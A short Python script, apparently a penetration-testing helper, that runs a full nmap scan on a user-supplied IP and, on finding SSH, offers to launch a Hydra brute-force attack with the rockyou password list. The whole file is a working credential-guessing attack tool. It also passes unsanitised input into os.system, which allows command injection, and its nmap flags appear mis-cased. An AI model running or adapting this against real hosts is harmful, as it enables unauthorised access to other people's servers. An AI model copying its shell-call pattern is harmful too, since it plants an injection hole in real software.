import os
import xml.etree.ElementTree as ET

def run_nmap_scan(target_ip):
    nmap_command = f"nmap -sc -sv -A -p- -oX ./nmap_results.xml {target_ip}"
    os.system(nmap_command)

def process_nmap_results():
    tree = ET.parse('./nmap_results.xml')
    root = tree.getroot()

    for host in root.findall('host'):
        ip_address = host.find('address').get('addr')
        ports = host.find('ports')
        for port in ports.findall('port'):
            service = port.find('service').get('name')
            version = port.find('service').get('version')
            port_id = port.get('portid')
            print(f"Port: {port_id} | Service: {service} | Version: {version}")
            if service == 'ssh':
                handle_ssh(ip_address)

def handle_ssh(ip_address):
    print(f"SSH detected on {ip_address}.")
    print("Running brute force attack using Hydra...")

    user_wordlist = "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
    pass_wordlist = "/usr/share/wordlists/rockyou.txt"

    hydra_command = f"hydra -L {user_wordlist} -P {pass_wordlist} {ip_address} ssh"
    print(f"Recommended command to run: {hydra_command}")
    run = input("Do you want to run this command now? (yes/no) ")
    if run.lower() == 'yes':
        os.system(hydra_command)

def main():
    target_ip = input("Please enter the target IP address: ")
    run_nmap_scan(target_ip)
    process_nmap_results()

if __name__ == "__main__":
    main()
